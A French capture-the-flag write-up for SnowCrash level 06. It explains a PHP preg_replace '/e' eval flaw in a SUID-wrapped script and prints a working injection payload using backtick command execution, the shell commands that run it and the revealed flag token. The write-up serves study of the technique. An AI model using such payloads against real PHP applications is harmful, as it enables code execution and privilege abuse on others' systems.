# Niveau 06 : Injection de code PHP via le modificateur /e de preg_replace

## Analyse de la vulnérabilité

Après examen des fichiers dans le répertoire personnel de level06, nous trouvons :

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

Le binaire `level06` appartient à l'utilisateur `flag06` et a le bit SUID activé, ce qui signifie qu'il s'exécute avec les privilèges de `flag06`.

En regardant `level06.php`, nous avons trouvé :

```php
#!/usr/bin/php
<?php
// Fonction pour remplacer les points par " x " et les @ par " y"
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
// Fonction pour lire un fichier, effectuer des remplacements complexes et retourner le contenu modifié
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
// Récupère les arguments de la ligne de commande, appelle la fonction x et affiche le résultat
$r = x($argv[1], $argv[2]); print $r;
?>
```

## Comprendre le code PHP

Pour ceux qui ne sont pas familiers avec PHP, voici ce que fait ce code :

1.  **Bases de PHP** : PHP est un langage de script côté serveur couramment utilisé pour le développement web. Le code ci-dessus est encapsulé dans des balises `<?php ?>` qui indiquent du code PHP.

2.  **Définitions de fonctions** :

    -   La fonction `y($m)` prend un paramètre chaîne de caractères et remplace les points par " x " et les symboles @ par " y".
    -   La fonction `x($y, $z)` prend deux paramètres (bien que `$z` ne soit jamais utilisé) :
        -   Elle lit le contenu du fichier spécifié par `$y`.
        -   Effectue une série de remplacements de motifs.
        -   Retourne le contenu modifié.

3.  **Exécution principale** : La ligne `$r = x($argv[1], $argv[2]); print $r;` appelle la fonction `x` avec les arguments de la ligne de commande et affiche le résultat.

## Vulnérabilité : preg_replace avec le modificateur /e

La vulnérabilité clé se trouve dans cette ligne :

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

Décortiquons cela :

-   `preg_replace()` est une fonction PHP qui recherche des motifs dans des chaînes et les remplace.
-   `/(\[x (.*)\])/e` est une expression régulière :
    -   `\[x ` correspond littéralement à "[x ".
    -   `(.*)` capture tous les caractères entre "[x " et "]".
    -   Le modificateur `/e` est critique - il indique à PHP d'évaluer la chaîne de remplacement comme du code PHP *après* substitution.

Le modificateur `/e` dans `preg_replace` évalue la chaîne de remplacement comme du code PHP, ce qui est une fonctionnalité obsolète et dangereuse permettant l'exécution de code à distance.

## Exploitation

1.  Création d'un fichier avec le contenu suivant :

    ```
    [x {${`getflag`}}]
    ```

2. Lorsque traité par le script PHP, ce code d'exploitation fonctionne comme suit:

   - Notre motif `` [x {${`getflag`}}] `` est détecté par l'expression régulière
   - Le modificateur `/e` amène PHP à évaluer `` y("{${`getflag`}}") `` comme du code
   - La syntaxe `${...}` en PHP est l'interpolation de variables:
      1. Traite `` ${`getflag`} `` 
      2. Exécute la commande `getflag` via les backticks
      3. Remplace l'expression entière par le résultat de la commande
   - Ainsi, `getflag` est exécuté et sa sortie est retournée

3.  Exécution :

    ```bash
    level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/exploit.txt
    level06@SnowCrash:~$ ./level06 /tmp/exploit.txt
    Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    ```